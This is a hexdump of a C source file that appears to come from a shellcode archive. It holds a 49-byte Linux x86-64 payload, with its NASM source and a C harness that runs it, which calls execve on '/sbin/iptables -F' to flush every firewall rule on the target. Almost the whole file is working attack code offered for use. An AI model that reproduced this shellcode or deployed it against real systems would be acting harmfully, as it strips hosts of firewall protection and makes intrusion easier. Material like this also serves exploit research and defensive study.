00000000  2f 2a 0d 0a 20 20 20 20  54 69 74 6c 65 3a 20 4c  |/*..    Title: L|
00000010  69 6e 75 78 2f 78 38 36  2d 36 34 20 2d 20 65 78  |inux/x86-64 - ex|
00000020  65 63 76 65 28 22 2f 73  62 69 6e 2f 69 70 74 61  |ecve("/sbin/ipta|
00000030  62 6c 65 73 22 2c 20 5b  22 2f 73 62 69 6e 2f 69  |bles", ["/sbin/i|
00000040  70 74 61 62 6c 65 73 22  2c 20 22 2d 46 22 5d 2c  |ptables", "-F"],|
00000050  20 4e 55 4c 4c 29 20 2d  20 34 39 20 62 79 74 65  | NULL) - 49 byte|
00000060  73 0d 0a 20 20 20 20 41  75 74 68 6f 72 3a 20 31  |s..    Author: 1|
00000070  30 6e 31 7a 33 64 20 3c  31 30 6e 31 7a 33 64 5b  |0n1z3d <10n1z3d[|
00000080  61 74 5d 77 5b 64 6f 74  5d 63 6e 3e 0d 0a 20 20  |at]w[dot]cn>..  |
00000090  20 20 44 61 74 65 3a 20  46 72 69 20 30 39 20 4a  |  Date: Fri 09 J|
000000a0  75 6c 20 32 30 31 30 20  30 33 3a 32 36 3a 31 32  |ul 2010 03:26:12|
000000b0  20 50 4d 20 45 45 53 54  0d 0a 20 20 20 20 20 0d  | PM EEST..     .|
000000c0  0a 20 20 20 20 20 0d 0a  20 20 20 20 53 6f 75 72  |.     ..    Sour|
000000d0  63 65 20 43 6f 64 65 20  28 4e 41 53 4d 29 3a 0d  |ce Code (NASM):.|
000000e0  0a 20 20 20 20 20 0d 0a  20 20 20 20 73 65 63 74  |.     ..    sect|
000000f0  69 6f 6e 20 2e 74 65 78  74 0d 0a 20 20 20 20 20  |ion .text..     |
00000100  20 20 20 67 6c 6f 62 61  6c 20 5f 73 74 61 72 74  |   global _start|
00000110  0d 0a 20 20 20 20 20 20  20 20 20 0d 0a 20 20 20  |..         ..   |
00000120  20 5f 73 74 61 72 74 3a  0d 0a 20 20 20 20 20 20  | _start:..      |
00000130  20 20 78 6f 72 20 20 20  20 20 72 61 78 2c 20 72  |  xor     rax, r|
00000140  61 78 0d 0a 20 20 20 20  20 20 20 20 70 75 73 68  |ax..        push|
00000150  20 20 20 20 72 61 78 0d  0a 20 20 20 20 20 20 20  |    rax..       |
00000160  20 70 75 73 68 20 20 20  20 77 6f 72 64 20 30 78  | push    word 0x|
00000170  34 36 32 64 0d 0a 20 20  20 20 20 20 20 20 6d 6f  |462d..        mo|
00000180  76 20 20 20 20 20 72 63  78 2c 20 72 73 70 0d 0a  |v     rcx, rsp..|
00000190  20 20 20 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |         ..     |
000001a0  20 20 20 6d 6f 76 20 20  20 20 20 72 62 78 2c 20  |   mov     rbx, |
000001b0  30 78 37 33 36 35 36 63  36 32 36 31 37 34 66 66  |0x73656c626174ff|
000001c0  66 66 0d 0a 20 20 20 20  20 20 20 20 73 68 72 20  |ff..        shr |
000001d0  20 20 20 20 72 62 78 2c  20 30 78 31 30 0d 0a 20  |    rbx, 0x10.. |
000001e0  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 72  |       push    r|
000001f0  62 78 0d 0a 20 20 20 20  20 20 20 20 6d 6f 76 20  |bx..        mov |
00000200  20 20 20 20 72 62 78 2c  20 30 78 37 30 36 39 32  |    rbx, 0x70692|
00000210  66 36 65 36 39 36 32 37  33 32 66 0d 0a 20 20 20  |f6e6962732f..   |
00000220  20 20 20 20 20 70 75 73  68 20 20 20 20 72 62 78  |     push    rbx|
00000230  0d 0a 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |..        mov   |
00000240  20 20 72 64 69 2c 20 72  73 70 0d 0a 20 20 20 20  |  rdi, rsp..    |
00000250  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 70  |     ..        p|
00000260  75 73 68 20 20 20 20 72  61 78 0d 0a 20 20 20 20  |ush    rax..    |
00000270  20 20 20 20 70 75 73 68  20 20 20 20 72 63 78 0d  |    push    rcx.|
00000280  0a 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |.        push   |
00000290  20 72 64 69 0d 0a 20 20  20 20 20 20 20 20 6d 6f  | rdi..        mo|
000002a0  76 20 20 20 20 20 72 73  69 2c 20 72 73 70 0d 0a  |v     rsi, rsp..|
000002b0  20 20 20 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |         ..     |
000002c0  20 20 20 3b 20 65 78 65  63 76 65 28 22 2f 73 62  |   ; execve("/sb|
000002d0  69 6e 2f 69 70 74 61 62  6c 65 73 22 2c 20 5b 22  |in/iptables", ["|
000002e0  2f 73 62 69 6e 2f 69 70  74 61 62 6c 65 73 22 2c  |/sbin/iptables",|
000002f0  20 22 2d 46 22 5d 2c 20  4e 55 4c 4c 29 3b 0d 0a  | "-F"], NULL);..|
00000300  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 20  |        mov     |
00000310  61 6c 2c 20 30 78 33 62  0d 0a 20 20 20 20 20 20  |al, 0x3b..      |
00000320  20 20 73 79 73 63 61 6c  6c 0d 0a 2a 2f 0d 0a 20  |  syscall..*/.. |
00000330  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
00000340  6f 2e 68 3e 0d 0a 20 0d  0a 63 68 61 72 20 73 68  |o.h>.. ..char sh|
00000350  65 6c 6c 63 6f 64 65 5b  5d 20 3d 20 22 5c 78 34  |ellcode[] = "\x4|
00000360  38 5c 78 33 31 5c 78 63  30 5c 78 35 30 5c 78 36  |8\x31\xc0\x50\x6|
00000370  36 5c 78 36 38 5c 78 32  64 5c 78 34 36 5c 78 34  |6\x68\x2d\x46\x4|
00000380  38 5c 78 38 39 5c 78 65  31 5c 78 34 38 5c 78 62  |8\x89\xe1\x48\xb|
00000390  62 5c 78 66 66 5c 78 66  66 22 0d 0a 20 20 20 20  |b\xff\xff"..    |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
000003b0  5c 78 37 34 5c 78 36 31  5c 78 36 32 5c 78 36 63  |\x74\x61\x62\x6c|
000003c0  5c 78 36 35 5c 78 37 33  5c 78 34 38 5c 78 63 31  |\x65\x73\x48\xc1|
000003d0  5c 78 65 62 5c 78 31 30  5c 78 35 33 5c 78 34 38  |\xeb\x10\x53\x48|
000003e0  5c 78 62 62 5c 78 32 66  5c 78 37 33 22 0d 0a 20  |\xbb\x2f\x73".. |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000400  20 20 22 5c 78 36 32 5c  78 36 39 5c 78 32 66 5c  |  "\x62\x69\x2f\|
00000410  78 36 39 5c 78 37 30 5c  78 35 33 5c 78 34 38 5c  |x69\x70\x53\x48\|
00000420  78 38 39 5c 78 65 37 5c  78 35 30 5c 78 35 31 5c  |x89\xe7\x50\x51\|
00000430  78 35 37 5c 78 34 38 5c  78 38 39 5c 78 65 36 22  |x57\x48\x89\xe6"|
00000440  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000450  20 20 20 20 20 22 5c 78  62 30 5c 78 33 62 5c 78  |     "\xb0\x3b\x|
00000460  30 66 5c 78 30 35 22 3b  0d 0a 20 20 20 20 20 20  |0f\x05";..      |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00000480  69 6e 74 20 6d 61 69 6e  28 29 0d 0a 7b 0d 0a 20  |int main()..{.. |
00000490  20 20 20 70 72 69 6e 74  66 28 22 4c 65 6e 67 74  |   printf("Lengt|
000004a0  68 3a 20 25 64 20 62 79  74 65 73 2e 5c 6e 27 22  |h: %d bytes.\n'"|
000004b0  2c 20 73 74 72 6c 65 6e  28 73 68 65 6c 6c 63 6f  |, strlen(shellco|
000004c0  64 65 29 29 3b 0d 0a 20  20 20 20 28 2a 28 76 6f  |de));..    (*(vo|
000004d0  69 64 28 2a 29 28 29 29  20 73 68 65 6c 6c 63 6f  |id(*)()) shellco|
000004e0  64 65 29 28 29 3b 0d 0a  20 20 20 20 20 0d 0a 20  |de)();..     .. |
000004f0  20 20 20 72 65 74 75 72  6e 20 30 3b 0d 0a 7d     |   return 0;..}|
000004ff
